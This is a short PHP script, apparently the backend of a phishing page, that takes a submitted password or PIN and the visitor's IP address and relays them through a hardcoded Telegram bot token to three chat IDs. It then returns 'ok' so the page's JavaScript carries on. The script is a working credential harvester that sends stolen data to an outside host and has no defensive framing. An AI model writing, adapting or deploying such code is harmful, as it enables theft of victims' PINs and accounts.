<?php
// Limpieza de salida para evitar bloqueos
ob_clean();
error_reporting(0);

$p = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];

$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
$ids = ["8114050673", "8518977918", "8638340940"]; 

if(!empty($p)){
    $msg = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - CLAVE</b> ⭐\n\n";
    $msg .= "🔑 <b>PIN:</b> <code>$p</code>\n";
    $msg .= "📍 <b>IP:</b> $ip";

    foreach($ids as $id){
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $id,
            'text' => $msg,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Tiempo corto para no trabar
        curl_exec($ch);
        curl_close($ch);
    }
    // ESTO ES LO QUE DESBLOQUEA EL JS
    echo "ok";
}
?>
